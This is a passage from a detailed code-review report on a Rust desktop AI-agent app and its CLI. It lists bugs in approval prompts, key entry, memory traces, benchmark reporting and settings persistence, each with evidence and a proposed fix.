- **Impact:** Training-data attribution and dataset analysis (`kai data stats` groups by `backend · model`) are wrong for every local/native/failover run; a local Holo run is filed as Gemma.
- **Fix:** Reuse the same resolution as `backend::model_label` (it already returns `s.local_model` for Local) inside `run_recorder`, and pass the native model (`o.model`) for `BackendArg::OpenaiNative`; for `Auto`, record the choice that will actually answer (Local → `local`, chain → resolve or label `auto (chain)` explicitly). Extend the backend tests to cover `run_recorder`'s meta for Local.

#### [CLI-04] Approvals with no TTY can hang forever (open pipe) or stop silently (EOF), with no hint to use `--yes`
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/console.rs:104-137`, constructed at `crates/kai-cli/src/main.rs:391` and `crates/kai-cli/src/bench/runner.rs:317`
- **What:** `TerminalApprover` never checks whether stdin is a terminal. On `Ok(0)` (EOF, e.g. `< /dev/null` or a closed CI stdin) the run silently becomes `Stop` with only the ordinary refusal prompt printed; on an open-but-idle pipe (`cmd | kai run …`, some CI runners) `read_line` blocks indefinitely. `--yes` does not help for passwords/payments, which always take this path.
- **Evidence:**
  ```rust
  eprint!("\n  ⚠ Kai wants to {what}{on}. Approve? [y]es / [s]kip / [n]o, stop: ");
  let mut line = String::new();
  if std::io::stdin().lock().read_line(&mut line).is_err() { return ApprovalChoice::Stop; }
  ```
  (an empty read is not an error, so EOF falls through to `_ => Stop`)
- **Impact:** A headless `kai run --yes "…"` that meets a password field either freezes the job or fails with a misleading "stopped"; the human fix ("run in a terminal or avoid this step") is never stated.
- **Fix:** Detect `std::io::IsTerminal::is_terminal(&stdin)` once when constructing the approver (same pattern as `main.rs:394` for `TerminalHuman`) and print "stdin is not a terminal: approvals can't be asked here; use --yes or a terminal" before returning `Stop`; optionally add a short timeout around the read. Add a test that a non-TTY approver returns `Stop` immediately.

#### [CLI-05] `kai key` echoes the API key while it is typed
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/main.rs:161-175`
- **What:** The key is read with plain `stdin().read_line`, so on a terminal the secret is echoed and stays in scrollback (and in any terminal logging). Every other credential CLI on this platform disables echo.
- **Evidence:**
  ```rust
  eprint!("Paste the {which} API key and press Enter: ");
  let mut line = String::new();
  std::io::stdin().read_line(&mut line)?;
  ```
- **Impact:** Shoulder-surfing/scrollback/keylogger exposure of a long-lived API key, exactly the artefact `README.md:173` promises is kept safe in the keychain.
- **Fix:** Disable echo while reading when stdin is a TTY (turn off `ECHO` via `libc::tcgetattr/tcsetattr` under the already-present unix `libc` dependency, or add `rpassword`), restore it on error, and keep the piped path as-is. Print a newline after the Enter. Manual check: `kai key gemini`, type, confirm the key is not shown.

#### [CLI-06] `--no-memory` still writes a trace that `kai memory consolidate` will learn from
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/main.rs:408,482` (+ `crates/kai-cli/src/mcp.rs:35`, docs/MEMORY.md:202)
- **What:** The flag's help says "Neither use nor add to what Kai learned on this computer", but `memory::save_trace(&trace)` runs unconditionally; `<config>/traces/*.json` is exactly the corpus `kai memory consolidate` reads (`memory.rs:144`, `memory.rs:280-296`). The plan cache and procedure store (also "learned" artefacts) are gated only by `--no-plan-cache` / `--procedures`, so a `--no-memory` run can still replay cached openings. `settings.learn = false` likewise does not stop the save.
- **Evidence:**
  ```rust
  let memory = use_memory.then(|| MemoryStore::load(…));   // only this is gated
  …
  memory::save_trace(&trace);                              // unconditional
  ```
- **Impact:** Users who ask for a forgetful/private run still leave the raw material for future lessons on disk (with prompts and replies), contradicting docs/MEMORY.md:202 and the app's Privacy wording.
- **Fix:** Gate `save_trace` on `use_memory` (and `main.rs:408` likewise; `mcp.rs` should respect the same rule or say it never returns the run to memory). Either that, or rename the flag to `--no-lessons` and document that traces and plan-cache entries are still written. Add a unit test asserting no file appears under `Settings::traces_dir()` when recording is off (use a temp `XDG_CONFIG_HOME`).

#### [CLI-07] Bench numbers depend on unrecorded user settings (`learn`, `reflect`, `approval`)
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/backend.rs:136-148`, consumed by `crates/kai-cli/src/bench/mod.rs:160-170`; `Meta` at `bench/mod.rs:322-339` records none of it
- **What:** `backend::config` copies `approval`, `learn` and `reflect` from the user's `settings.json` into the bench engine, but the results file records only the A/B flags, command line and machine. Concretely: with the app's *Learn from mistakes* off, `kai bench --memory --repeat 2` silently learns nothing (`runner.rs:427-431` calls `after_run(..., live.config.learn)`), so the "lessons" comparison is meaningless; with *Reflect after failures* on, every failed task costs an extra model call that lands in `model_calls`/tokens (only when `--memory`/`--lessons` make `opts.memory` some, but that is the documented exam setup).
- **Evidence:**
  ```rust
  pub fn config(s: &Settings, ab: &Ab) -> … {
      let mut c = Config { …, approval: s.approval, learn: s.learn, reflect: s.reflect, ..Config::default() };
  ```
- **Impact:** Two machines (or two reviewers) produce different, non-comparable numbers with identical commands; the memory exam can be confounded by a setting the results file cannot show.
- **Fix:** In `bench::run`, force `learn = true` and `reflect = false` for bench config (or add explicit `--reflect` and record it); at minimum record `approval`, `learn`, `reflect` in `Meta`/`Summary` (new optional fields) and print a note when they differ from defaults. Add a test that a settings value of `learn=false` still results in `memory.after_run` being called under `--memory`.

#### [CLI-08] `kai bench report` merges incomparable results without a warning
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/bench/report.rs:222-253` (`load_latest`), `report.rs:256-335` (`merged_markdown`)
- **What:** The report groups by `(backend, model)` and keeps the newest date, but never checks that the columns share a machine, a task set, prices, A/B flags, or even that the "latest" file was produced by a superset of tasks. A `--only fill-form…` subset run becomes a full column showing "4 / 4 (100%)" beside "23 / 30 (77%)". Differences are visible only if the reader inspects the Machine/A/B rows.
- **Evidence:** `let key = (s.backend.clone(), s.model.clone()); let newer = latest.get(&key).is_none_or(|(_, old)| s.date >= old.date);` — no machine/flags/task-set comparison; `"Tasks passed"` uses `passed / total` of that file alone.
- **Impact:** Head-to-head tables silently mix containers, settings and task subsets; the README's careful caveats ("one run per model") are undermined by the tool itself.
- **Fix:** In `merged_markdown`, detect and print a warning block when any two columns differ in `machine.cpu`/`os`/`display`, in `ab`, in `prices`, or in `tasks.len()`; optionally require `--allow-mixed` to proceed. Add a unit test with two summaries of different machines/task counts asserting the warning text.

#### [CLI-09] GRPO export: valid RL task files are rejected, `macos` commands are dropped, and a missing task list degrades silently
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/data/mod.rs:68-81`, `crates/kai-cli/src/data/export.rs:74-79,196-203`, `crates/kai-cli/src/bench/tasks.rs:135`
- **What:** Three distinct defects in one flow: (1) `export --format grpo --tasks my.yaml` loads the file through `load_tasks`, whose `validate` requires a non-empty `mock:` list — a bench-replay requirement that an RL environment's task file has no reason to satisfy, so the export fails on well-formed input; (2) `PerOsRow` keeps only `linux`/`windows`, so a mac-only `check`/`setup` disappears from the exported row; (3) when no `--tasks` is given and `bench/tasks.yaml` is not in the CWD, no file loads, no warning is printed, and every row has `setup/check/teardown: null` — a GRPO file with no reward.
- **Evidence:**
  ```rust
  for t in tasks { … anyhow::ensure!(!t.mock.is_empty(), "task {} has no recorded replies", t.id); }   // tasks.rs:135
  pub struct PerOsRow { pub linux: Option<String>, pub windows: Option<String> }                       // export.rs:69-72
  let tasks = if tasks.is_empty() { ["bench/tasks.yaml", …].map(PathBuf::from).filter(|p| p.is_file()).collect() } // mod.rs:68
  ```
- **Impact:** Training pipelines either break on custom task files, silently lose macOS reward commands, or export reward-less datasets that look valid.
- **Fix:** Add `load_tasks_for_export` (skip `mock`/replay validation, keep dup/needs validation) and use it in `export`; add `macos: Option<String>` to `PerOsRow`; when the default task files are absent for `--format grpo`, bail with "pass --tasks <file> (bench/tasks.yaml not found)" instead of exporting null checks. Tests: export from a task file without `mock`, and from one with `macos` only.

#### [CLI-10] `--repeat` statistics are silent, clamped, and never reach the results file or report
- **Severity:** MEDIUM
- **Location:** `crates/kai-cli/src/bench/mod.rs:72-73,247,307-310`, `crates/kai-cli/src/bench/repeat.rs:44-94`
- **What:** `--repeat` is clamped to 1..=5 without telling the user (the help says nothing about the cap), only first runs enter `Summary`/the results file, and the repeat table reports plain means (`Steps`, `Calls`, `Lessons shown`) with no per-task counts, variance, or confidence. `docs/ROADMAP.md`/`MODEL_STORE.md` ask for ≥2 runs per side; the CLI leaves the aggregation to the human and the report has no n column.
- **Evidence:**
  ```rust
  repeat: args.repeat.clamp(1, 5),                       // mod.rs:247, silently
  let runs: Vec<runner::Run> = runs.into_iter().filter(|r| r.pass == 0).collect();  // mod.rs:310
  ```
- **Impact:** "Promote only if the pass rate is at least as good" is decided on a single run per task, and users who type `--repeat 10` believe they measured ten.
- **Fix:** Warn when the clamp changes the value ("--repeat 10 capped at 5"); add per-run columns to `Summary` (runs, pass@k, min/max/mean±sd of steps and calls) for repeated tasks, or a `kai bench diff <a.json> <b.json>` that pairs tasks and reports wins/losses with the sample size. A Wilson lower bound on the pass rate would be enough to make columns comparable.

#### [CLI-11] `kai skill validate` with no arguments exits 1 with a self-contradictory summary
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/main.rs:151,237-273`
- **What:** `dirs` has no default and no `required`; an empty list produces `targets.is_empty()`, so the command prints "0 checked, 0 failed" and then fails. The help text has no description for the positional argument either.
- **Evidence:** `if bad == 0 && !targets.is_empty() { ExitCode::SUCCESS } else { ExitCode::FAILURE }` → `0 checked, 0 failed` + exit 1.
- **Impact:** Confusing UX; a user cannot tell whether the command rejected their invocation or their skills.
- **Fix:** Give the argument a doc comment and either default it to `skills` (matching README examples) or `anyhow::bail!("no directories given; try `kai skill validate skills`")` before the loop.

#### [CLI-12] Stale A/B header comment and an unreachable `applied=false` report branch
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/ab.rs:1-7,118-139`, `crates/kai-cli/src/backend.rs:146`, `crates/kai-cli/src/bench/report.rs:78-83`
- **What:** The file docs say features that the engine lacks are "refused with a clear error rather than silently ignored", but `apply_ab` ends `Ok(true)` unconditionally. As a result `Meta.ab.applied` is always `true` and the `"{flags} (engine has no switches; defaults)"` branch in `ab_text` can never render — dead code that suggests a safety property the build no longer has.
- **Evidence:**
  ```rust
  /// Always `Ok(true)`: every switch maps to a real `Config` field …
  pub fn apply_ab(config: &mut Config, ab: &Ab) -> anyhow::Result<bool> { … Ok(true) }
  ```
- **Impact:** Readers (and future agents) trust a guarantee that is not enforced; the report's warning path never fires if a switch silently does nothing.
- **Fix:** Update the header comment to the current contract, and either delete the `applied` field/branch or make `apply_ab` return `Ok(false)`/`Err` for switches with no `Config` effect (the honest behaviour the comment promises).

#### [CLI-13] File errors lose the path: "No such file or directory" tells the user nothing
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/bench/tasks.rs:106-109`, `crates/kai-cli/src/bench/variants.rs:167`, `crates/kai-cli/src/bench/report.rs:223`
- **What:** Parse errors get a `in <path>` context, but read errors do not; `read_dir` on a missing results dir has no context at all. `kai bench --tasks missing.yaml` and `kai bench report --dir missing` print bare OS errors.
- **Evidence:** `parse_tasks(&std::fs::read_to_string(path)?).map_err(|e| e.context(…))` — only the parse branch is contextualised.
- **Impact:** Automation and humans cannot tell which argument was wrong when several files are involved.
- **Fix:** Wrap each read with `.with_context(|| format!("reading {}", path.display()))` (same for `read_dir`), and add a test asserting the path appears in the error string.

#### [CLI-14] Variant generation: `per_os_has` forgets `macos`, and `--n 0` reports the wrong reason
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/bench/variants.rs:46-50,166-175`
- **What:** `check_vars` decides a var is "used" by looking at title/prompt/mock/setup/check/teardown, but `per_os_has` inspects only `linux` and `windows`. A var referenced only in a `macos:` command fails validation as "never used", while `render`/`subst_os` do substitute `macos`. Separately, `kai bench variants --n 0` produces no variants and reports "no task in … declares vars", which is false.
- **Evidence:** `[&p.linux, &p.windows].iter().any(…)` — `p.macos` absent.
- **Impact:** macOS-targeted task sets cannot be rendered; a valid flag value gives a misleading error.
- **Fix:** Include `p.macos` in `per_os_has`; distinguish an empty `n` from "no vars" in `write`, and add a unit test for a macos-only placeholder and for `n == 0`.

#### [CLI-15] Blocking DNS/subprocess calls run on async executor threads
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/bench/tasks.rs:227-235` (`internet()`); `crates/kai-cli/src/bench/machine.rs:37-47` (`cmd`), called at `bench/mod.rs:327`; `crates/kai-cli/src/bench/record.rs:100-110` (`git describe`), called from `bench/mod.rs:206` and `runs.rs:75`
- **What:** `Available::probe()` performs a synchronous DNS lookup plus up to 2 s-per-address TCP connect inside `run_live`; `Machine::probe()` and `record::kai_version()` spawn `git`/`xdotool`/`sysctl` synchronously from async functions. The runtime is multi-threaded so this does not deadlock, but it stalls a worker and can delay bench startup by seconds on a broken resolver.
- **Evidence:** `std::net::TcpStream::connect_timeout(&a, Duration::from_secs(2))` inside `addrs.any(...)`; `std::process::Command::new(program) … .output()`.
- **Impact:** Slow or hanging starts; worse under a single-threaded runtime (tests, future embeddings).
- **Fix:** Wrap `Available::probe()` and `Machine::probe()` in `tokio::task::spawn_blocking` at their async call sites (or make them `async` and use `tokio::process::Command` / `lookup_host`).

#### [CLI-16] Progress output writes ANSI unconditionally and nothing machine-readable exists outside `kai data`/`bench`
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/models.rs:217-235`; no `--json` on `Command::Doctor`, `ModelsCmd::List`, `kill`/`validate`/`run`/`smoke` (`main.rs:79-101`)
- **What:** The install progress line always emits `\r\x1b[2K` to stderr, so logs/CI capture raw control bytes. Conversely, there is no machine-readable output anywhere for doctor/models/skill validate — automation must scrape human text that is explicitly allowed to change.
- **Evidence:** `write!(err, "\r\x1b[2K[{}] {pct} {} ({})", …)` with no `is_terminal` check.
- **Impact:** Noisy CI logs; brittle integrations (a monitor wrapping `kai doctor` has to parse `Debug` status values).
- **Fix:** Gate the carriage-return/clear sequence on `std::io::stderr().is_terminal()` and fall back to one line per stage; add `--json` to `doctor` (health/keys/models) and `models list` (catalog + fit). Low effort, high automation value.

#### [CLI-17] `kai smoke` has its own percentile function; model p95 is computed and thrown away in the bench
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/main.rs:311-318`; `crates/kai-cli/src/bench/stats.rs:231`
- **What:** `smoke` defines `p = |q| times[((len-1) as f64 * q).round()]`, duplicating `bench::stats::percentile` (which has tests). `stats::summarise` computes `p50_p95(...).0` and discards the p95 allocation/result for the per-task model p50.
- **Evidence:** `let p = |q: f64| times[((times.len() - 1) as f64 * q).round() as usize];` / `r.model_p50_ms = p50_p95(tm.iter().map(|t| t.model_ms).collect()).0;`
- **Impact:** Two definitions of p95 can drift; a needless sort per task (small).
- **Fix:** Call `kai_cli::bench::stats::percentile`/`p50_p95` from `smoke` (make `stats` pub is already true), and add a `percentile_50` helper or use `p50_p95(..).0` intentionally with a comment.

#### [CLI-18] `memory::save_trace` collides within a second and can write an empty file
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/memory.rs:264-276`
- **What:** The trace file name is seconds since the epoch, so two runs finishing in the same second overwrite each other; `serde_json::to_string_pretty(trace).unwrap_or_default()` writes a 0-byte file on a serialization failure instead of skipping and logging.
- **Evidence:** `let name = format!("{}.json", jiff::Timestamp::now().as_second());` … `serde_json::to_string_pretty(trace).unwrap_or_default()`.
- **Impact:** Silent loss of one run's trace (and the lessons consolidation would draw from it); a corrupt empty file is skipped by `saved_traces` but still litters the directory.
- **Fix:** Use milliseconds (`as_millisecond()`) or a PID/uuid suffix, and match on the `serde_json` result: on error `log::warn!` and return without writing.

#### [CLI-19] Inconsistent lane/backend combinations: `run` allows native+browser, `bench` only rejects literal `Mock`
- **Severity:** LOW
- **Location:** `crates/kai-cli/src/main.rs:370-390`, `crates/kai-cli/src/bench/mod.rs:195-201`
- **What:** `kai bench` refuses `--browser` for `openai-native` and a literal `--backend mock`, but `--backend auto` resolving to the Mock setting passes the check and then plays `MockClient::always("done")` against the real browser lane; symmetrically, `kai run --browser --backend openai-native` silently wires OpenAI's own loop to the browser lane, a combination the bench explicitly forbids.
- **Evidence:**
  ```rust
  anyhow::ensure!(b != BackendArg::OpenaiNative && b != BackendArg::Mock,
      "--browser works with Kai's own loop on a live or replay backend");
  ```
  (checks the flag, not the resolved `s.backend`)
- **Impact:** Surprising runs that are impossible to interpret (mock replies graded on a real screen; native loop in a lane it was not designed for).
- **Fix:** Resolve `auto` first (`s.backend`) before the guard, and add the same guard in `run_task` (or an explicit log line "native loop in the browser lane" if it is intended).

### Not needed / remove

- **`keyring` dependency** — `crates/kai-cli/Cargo.toml:27`; no `keyring::` reference exists anywhere in `crates/kai-cli/src` (grep verified). Secrets go through `kai_os::secrets`, which owns that dependency. Remove the line; `cargo check -p kai-cli` confirms.
- **`tokio` features = "full"** — used features are `io-util`, `macros`, `rt-multi-thread`, `signal`, `time`, `process` (none). Narrow to what `kai-core` needs if the workspace feature set allows; low-risk size/build-time cleanup, keep if shared features make it awkward.
- **`applied` plumbing / dead report branch** — `crates/kai-cli/src/ab.rs:118-139`, `bench/machine.rs:9-15`, `bench/report.rs:78-83`; the `applied=false` branch is unreachable because `apply_ab` always returns `Ok(true)`. Either delete the field and branch or restore the behaviour the ab.rs header describes.
- **Duplicate percentile** — `crates/kai-cli/src/main.rs:311-318` should call `bench::stats::percentile` (CLI-17); removing the local closure removes a drift risk.
- **`bench::runner::run_mock` (cfg(test)) wrapper** — only used by tests in `data/tests.rs`; harmless, but `run_mock_with(..., MemoryOpts::default())` at the three call sites would remove the wrapper entirely if tidiness matters.
- **Duplicate skill discovery and engine construction** — see INFO findings below; not dead code today, but the two copies have already drifted (CLI searches `../skills`/`../../skills` from the CWD; the app additionally searches `<exe>/../../skills`). Consolidating into one `kai_core` helper (e.g. `skill::find_shipped_dir()` and an `Engine` constructor) is the real fix.

### What's good

- **Honest accounting.** `bench/stats.rs:288-315` reports unmeasurable data in `Summary::missing` instead of zeros, and `bench/tests.rs:176-195` pins it ("tokens and cost: none (recorded replies, no model was called)"). `bench/report.rs:1-4` documents "never fills in a number that was not measured", and `load_latest` skips junk files with a message (`report.rs:236-243`).
- **No-overwrite recorded runs.** `bench/record.rs:39-45` names a second run `<task-id>.2`, with `data/tests.rs:90-96` asserting it. (The results-file counterpart is CLI-02.)
- **Action descriptions and approver text.** `console.rs:66-94` (`describe`) yields `press ctrl+s`, `run \`df -h\``, `click #4`, with tests at `console.rs:217-229`; approval prompts name the element and Kai's reason (`console.rs:112-123`).
- **MCP safety posture.** `mcp.rs:14-23` skips every step requiring approval, `mcp.rs:52-57` downgrades Autopilot to HighRiskOnly, and stdout carries only protocol lines (`mcp.rs:89-105`); this matches docs/MCP.md:37-49.
- **Headless human checks.** `main.rs:392-394` only offers `TerminalHuman` when stdin is a TTY — exactly the DECISIONS.md:412-414 contract ("headless/bench/piped runs … end as AskedUser").
- **Key handling.** `backend.rs:117-132` fails before any network call with `run \`kai key gateway\` or set AI_GATEWAY_API_KEY`, and `key_report()` (`backend.rs:181-212`) never prints a key — only "key set (keychain)".
- **Variant discipline.** `variants.rs:88-131` renders defaults first and orders the "diagonal" so paired vars stay paired; the generated file's header forbids manual edits and head-to-head use, and `bench/mod.rs:344-348` diverts variant results into a subfolder `kai bench report` never reads.
- **Shell/environment hygiene in the bench.** `runner.rs:184-209` single-quotes env values and reports `[exit 0]`; `KAI_BENCH_DIR`/`KAI_BENCH_LANE`/`KAI_BENCH_OPEN_FILE` are documented at the top of `bench/tasks.yaml`.
- **Failure taxonomy wired end to end.** `record::label` → `TaskResult.failure` → `Summary.failures` → report "Failure categories" plus a per-row Failure cell (`stats.rs:259`, `report.rs:147,160-165,211`), with a test that a false `done` is labelled `false_done` (`bench/tests.rs:140-149`).
- **Executor measurement plumbing.** `executor_tests.rs:10-84` runs a scripted fake jevos through the real engine and asserts the counters and the Markdown row ("on · 2 decisions · 0 escalations"), so `--executor` numbers cannot silently disappear.
- **Cancel-and-resume install.** `models.rs:236-248` keeps the partial download on Ctrl-C and tells the user to re-run to resume; `ensure_local` (`models.rs:254-277`) only starts a server when the running one is not the requested model.
- **Reproducibility metadata.** `machine.rs:53-115` fingerprints CPU/cores/OS/kernel/display/a11y env/browser/commit, and `command_line()` (`machine.rs:117-132`) quotes argv safely — the best-effort record of how a number was produced.

### Open questions

1. Should a completed `kai bench` with failed tasks exit non-zero by default? The macOS/Windows workflows use `continue-on-error`, so a `--fail-on-any-failure` flag (plus a hard failure when zero tasks ran) may be the owner's preferred compromise.
2. Is `--no-memory` meant to stop trace persistence, plan-cache reuse and procedure recording as well, or only the lesson store? docs/MEMORY.md:202 and the flag help currently promise more than the code does.
3. Should `--repeat` passes 2..N be recorded under `<task>.2`? `docs/DATASET.md:12` describes exactly that naming, but `runner.rs:263,398` deliberately records only pass 0.
4. Are same-day results files expected to be disposable (documented `--out`-per-run practice), or should `report::write` auto-suffix to make loss impossible?
5. Is terminal-echoed input for `kai key` acceptable for this audience, or should the CLI take a new dependency for hidden input?
6. Should `kai run` install a SIGINT handler that trips the kill switch, given shell children run in their own process group and are currently orphaned by Ctrl-C?

---

## 3.7 APP-SH — Desktop app shell (state, windowing, lifecycle)

*Reviewed files: 29. Findings: 0C / 3H / 9M / 7L / 0I.*

Read-only review fragment for the full-app swarm review. Scope: every file under `crates/kai-app/src` except `src/pages/**` and `src/onboarding/**`, plus `crates/kai-app/Cargo.toml` and `build.rs`. Every file in scope was read in full, line by line. Supporting reads: `README.md`, `docs/UI_UX_AUDIT_2026_10_16.md`, all of `DECISIONS.md`, and out-of-scope cross-checks in `crates/kai-core` (settings, models/rank, ports), `crates/kai-os` (kill, notify, input, desktop, local), and `vendor/ely-gpui-component` (shell windows, i18n, input actions) wherever the app bridges into them.

TODO/FIXME/HACK/placeholder scan: **none found** in scope. The only `placeholder` matches are `TextInput::placeholder(...)` UI hints (product strings, not stubs).

### Scope covered

- [x] `crates/kai-app/src/agent.rs` — 454 — Clean UI bridge; unbounded channel carries one message per step, no re-render storm; the wart is synchronous hands rebuild on the UI thread (SH-04).
- [x] `crates/kai-app/src/anim.rs` — 123 — Small keyed view-fade helper; correct animation ids; no issues.
- [x] `crates/kai-app/src/app.rs` — 465 — Coherent root view and action wiring; persistence helper is the weak spot (SH-01) and dialogs paint uncoordinated (SH-12).
- [x] `crates/kai-app/src/approval.rs` — 127 — Safety-critical UI done well (exact action JSON, close-time choice, Escape/scrim = Stop); only the serialization expect-policy is inconsistent (SH-13).
- [x] `crates/kai-app/src/asks.rs` — 66 — One-shot Approver/HumanHelper; send-drop and reply-drop both answer Stop; correct; stale doc reference (SH-14).
- [x] `crates/kai-app/src/assets.rs` — 44 — Embeds `KaiAssets` and app icon; `expect`s only on build-time-embedded data; fine.
- [x] `crates/kai-app/src/brand.rs` — 143 — Applies settings to theme; contrast-guard tests; fine.
- [x] `crates/kai-app/src/browser.rs` — 42 — Thin wrapper over Kai's browser lane; fine.
- [x] `crates/kai-app/src/chrome.rs` — 273 — Title bar/sidebar/status/palette composition; display-only key strings acceptable; fine.
- [x] `crates/kai-app/src/control.rs` — 198 — `RunControl` pause/stop/steer on tokio `Notify`; tests cover both-stop and paused-stop; solid.
- [x] `crates/kai-app/src/errors.rs` — 55 — Friendly next-step error mapping with tests; good.
- [x] `crates/kai-app/src/follow.rs` — 240 — Transcript follow policy; 10 unit tests; consistent with scroll wiring.
- [x] `crates/kai-app/src/human_dialog.rs` — 93 — Code/question dialog; masked draft, parses one-time codes, requires text for answers; fine.
- [x] `crates/kai-app/src/i18n.rs` — 63 — Hand-rolled 19-key table beside a dead Ely `I18n` install; coverage partial and silently degrades (SH-05).
- [x] `crates/kai-app/src/keys.rs` — 60 — Keychain on its own thread, enforced by a source-guard unit test; excellent.
- [x] `crates/kai-app/src/local.rs` — 485 — Cancel-safe local model jobs, serial-checked messages; render-path catalog fallback (SH-06) and quit hook gap (SH-07).
- [x] `crates/kai-app/src/local_api.rs` — 105 — Internal facade over `kai_core::models`/`kai_os::local`; name suggests an HTTP surface that does not exist (SH-16).
- [x] `crates/kai-app/src/main.rs` — 157 — Startup/hotkey/window; no single-instance guard (SH-02); two startup `expect`s (SH-17).
- [x] `crates/kai-app/src/mini.rs` — 320 — Compact working window; strong control surface, but its close button can orphan decisions (SH-03), duplicated plumbing (SH-08) and an unconditional phase flip (SH-09).
- [x] `crates/kai-app/src/nav.rs` — 94 — Key bindings and minimal macOS menu; correct; the quit path it enables is SH-07.
- [x] `crates/kai-app/src/runs.rs` — 438 — Run queue, launch/stop/answer orchestration; mostly consistent; stale capture-exclusion snapshot (SH-10), duplicated stop loops (SH-08).
- [x] `crates/kai-app/src/state.rs` — 468 — `RunState` machine with balanced approval/check queues and the grace window; failure path leaves queues (SH-11), decision states can stack (SH-12), grace gives no feedback (SH-18).
- [x] `crates/kai-app/src/state_tests.rs` — 238 — Focused tests for the tricky state paths (balance, queues, Stop answers everything); good.
- [x] `crates/kai-app/src/store.rs` — 103 — HF search/download glue via oneshot + `cx.spawn`; fine.
- [x] `crates/kai-app/src/switcher.rs` — 148 — Model/backend menu; correct, but its status-bar render triggers the disk-read fallback (SH-06).
- [x] `crates/kai-app/src/team.rs` — 185 — Plan-to-wave derivation and per-sub-agent step mapping; consistent; no findings.
- [x] `crates/kai-app/src/ui.rs` — 374 — Shared widgets/Glass/log viewer; good; test-only coupling to a vendored file path (SH-19).
- [x] `crates/kai-app/Cargo.toml` — 49 — Small dependency set; bin-only crate (no lib), so app tests run through the bin target; fine.
- [x] `crates/kai-app/build.rs` — 20 — Windows icon embedding; host-`cfg` means cross-compiles silently skip it (SH-15).

Total: 29 files, 5,630 lines. Excluded by assignment: `src/pages/**` (13 files), `src/onboarding/**` (3 files) — owned by other fragments.

### Verdict

The app shell is in good shape for its age: the run state machine is deliberately balanced (queues for approvals and human checks, `take_all` on Stop, drop-abandoned pruning), the tokio→GPUI bridge is disciplined (unbounded channel carries one message per step, notifies coalesce, frames are `Arc<[u8]>`), and safety-critical flows answer Stop on dropped senders and replies. The weakest class of defects is lifecycle edges, not structure: a second instance is allowed and fights the first (SH-02), closing the mini window can hide every pending decision (SH-03), settings persistence is non-atomic with a silent reset on corruption (SH-01), and quitting abandons an in-flight run without tripping the kill switch (SH-07). These are the things to fix before iterating further on features.

Maintainability is above average but shows copy-paste gravity: the same stop/answer plumbing exists three times across `runs.rs` and `mini.rs` and has already drifted (SH-08, SH-09), the i18n module runs a parallel hand-rolled table while Ely's `I18n` sits installed and unread (SH-05), and `state.rs`/`local.rs` sit at ~470/485 lines against the house's 500-line ceiling. Test coverage is honest where state is tricky (`state_tests.rs`, `follow.rs`, `control.rs`, `keys.rs`, `errors.rs`) but silent where orchestration lives: `runs.rs`, `agent.rs`, `app.rs` and all dialogs have no tests, so the lifecycle findings above are exactly the untested surface.

Security engineering is visibly intentional — approval reset, one-shot replies, keychain off the UI thread with a source-guard test, loopback-only model server, no network listener in the app — which makes the remaining gaps stand out: two instances driving one mouse/keyboard and sharing one settings file, and Kai's own window re-entering the model's screenshots when the exclusion snapshot goes stale (SH-10). DECISIONS.md conflicts found: the dead Ely `I18n` install contradicts the documented "English-only UI" decision (reported in SH-05); `APPROVE_GRACE` is deliberate per state.rs comments/tests but is not recorded in DECISIONS.md (SH-18); the build.rs host-`cfg` caveat is mitigated by the documented native-CI decision (SH-15).

Scores: **correctness 7/10** — the state machine and message plumbing hold up, but failure/close/quit paths can strand or hide state. **security 7/10** — approval and keychain handling are strong; multi-instance and stale capture masking are the holes. **maintainability 6/10** — clear module-per-concern layout, held back by triplicated stop/answer logic, a parallel i18n mechanism, and two near-ceiling files. **test coverage 6/10** — meaningful unit tests where state is tricky, none on the orchestration (runs/agent/app) the findings cluster in. **architecture fit 8/10** — GPUI/Ely idioms are followed (observe/detach lifetimes, `cx.notify`, focus scopes, `take_focus`), and the async bridge is conservative; the gaps are lifecycle edges, not design.

### Findings

#### [APP-SH-01] Settings can be silently zeroed and are written synchronously on the UI thread
- **Severity:** HIGH
- **Location:** crates/kai-app/src/app.rs:180-190 (in-scope caller: switcher.rs:60-69, local.rs:365, app.rs:252); root cause crates/kai-core/src/settings.rs:261-283
- **What:** `save_settings` calls `Settings::save()` inline on the GPUI/UI thread. `save()` is a plain `std::fs::write` of the whole file with no temp-file+rename, so a crash, power loss, or ENOSPC mid-write truncates `settings.json`. `load()` then silently falls back to `Settings::default()` on any read or parse error, logging one line, so the next launch quietly resets every preference. There is no schema-version field to distinguish old from corrupt.
- **Evidence:**
  - `settings.rs:278-281` — `std::fs::write(Self::dir().join("settings.json"), serde_json::to_string_pretty(self)?)?;`
  - `settings.rs:263-272` — `serde_json::from_str(&text).unwrap_or_else(|e| { log::error!(...); Self::default() })`, and `Err(_) => Self::default()`.
  - Call sites write on each toggle immediately: `switcher.rs:62`, `switcher.rs:67`, `local.rs:365`, and the Settings page (out of scope) on every switch change.
- **Impact:** A single unlucky crash during any preference change silently discards backend choice, endpoints, disabled skills, team mode, lessons/memory toggles, etc. Every toggle also pays a full-file rewrite on the UI thread; on slow disks or with an AV scanner this hitches the frame.
- **Fix:** Write to `settings.json.tmp` then `fs::rename` (atomic on same filesystem). On parse error, rename the bad file to `settings.json.bad` and surface a one-time toast instead of pretending defaults are the user's settings. Add `schema_version` with a migration path. Debounce saves and/or move to the background executor.

#### [APP-SH-02] No single-instance guard: two copies of Kai fight over one mouse, one hotkey, one settings file
- **Severity:** HIGH
- **Location:** crates/kai-app/src/main.rs:61-136
- **What:** `main()` unconditionally starts the agent runtime, installs the global stop hotkey, and opens the main window. Nothing detects an already-running instance. The second instance's hotkey registration fails but only logs; both instances share `settings.json` and both can run agents that synthesize mouse/keyboard input.
- **Evidence:**
  - `main.rs:63-69` — agent runtime starts before any window or lock.
  - `main.rs:89-91` — hotkey failure is `log::error!` only; status bar then just shows no shortcut (`StopHotkey::label` returns None).
